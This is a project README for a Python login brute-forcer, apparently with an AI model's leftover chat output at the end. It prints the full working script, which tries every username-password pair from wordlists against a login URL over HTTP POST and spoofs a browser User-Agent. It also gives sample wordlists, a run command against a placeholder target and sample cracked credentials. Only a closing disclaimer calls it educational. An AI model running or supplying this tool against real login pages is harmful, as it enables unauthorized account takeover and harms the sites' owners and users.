# Login Bruteforce

This project is a simple Python script for brute-forcing usernames and passwords against a specified URL. The script reads a list of usernames and a list of passwords, then attempts to authenticate each username-password combination against the provided URL. If a valid combination is found, it is printed out.

## Prerequisites

- Python 3.x

## Installation

1. Clone the repository:

```sh
git clone https://github.com/arifbinekram/Login-Bruteforce.git
cd Login-Bruteforce
```

2. Ensure you have the required files:

   - `bruteforce.py` - The main script file.
   - `user.txt` - A file containing a list of usernames (one per line).
   - `pass.txt` - A file containing a list of passwords (one per line).

## Usage

1. Prepare your `user.txt` and `pass.txt` files. For example:

   `user.txt`:
   ```
   root
   angela
   bob
   john
   alice
   ```

   `pass.txt`:
   ```
   toor
   trustno1
   password123
   qwerty
   letmein
   123456
   ```

2. Run the script with the URL, user list file, and password list file as arguments:

```sh
python3 bruteforce.py http://www.vulnerablesite.com/login.html user.txt pass.txt
```

## Example Output

```
Found User and Password combinations:
root:toor
angela:trustno1
bob:password123
john:qwerty
```

## Script Details

### Code Explanation

```python
# brute force passwords
import sys
import urllib.parse
import urllib.request

if len(sys.argv) != 4:
    print("usage: {} url userlist passwordlist".format(sys.argv[0]))
    sys.exit(0)

url = str(sys.argv[1])
filename1 = str(sys.argv[2])
filename2 = str(sys.argv[3])

with open(filename1, 'r') as userlist, open(filename2, 'r') as passwordlist:
    foundcreds = []
    FailStr = "Incorrect User or Password"

    users = userlist.read().splitlines()
    passwords = passwordlist.read().splitlines()

    for user in users:
        for password in passwords:
            data = urllib.parse.urlencode({"username": user, "password": password}).encode('utf-8')
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            request = urllib.request.Request(url, data=data, headers=headers)
            try:
                with urllib.request.urlopen(request) as response:
                    response_text = response.read().decode('utf-8')
                    if response_text.find(FailStr) < 0:
                        foundcreds.append(user + ":" + password)
            except urllib.error.HTTPError as e:
                print(f"HTTP error occurred: {e.code} - {e.reason}")
            except urllib.error.URLError as e:
                print(f"URL error occurred: {e.reason}")

if foundcreds:
    print("Found User and Password combinations:\n")
    for name in foundcreds:
        print(name)
else:
    print("No users found")
```

### Explanation

1. **Importing Libraries**:
   - `sys` for command-line arguments.
   - `urllib.parse` and `urllib.request` for handling URL encoding and making HTTP requests.

2. **Command-Line Arguments**:
   - The script expects three arguments: URL, user list file, and password list file.

3. **Reading Files**:
   - Usernames and passwords are read from the specified files and stored in lists.

4. **Brute Force Logic**:
   - The script attempts each username-password combination by sending an HTTP POST request to the specified URL.
   - It checks the response for a specific failure string (`FailStr`).
   - If the failure string is not found, it means the login was successful, and the combination is saved.

5. **Output**:
   - The script prints any found username-password combinations or a message indicating that no valid combinations were found.


## Disclaimer

This script is intended for educational purposes only. Do not use it to attack any systems without proper authorization. Unauthorized access to computer systems is illegal and unethical.
```

You can save this content in a file named `README.md` in your project directory. Make sure to update the `LICENSE` file accordingly if it is not already present.
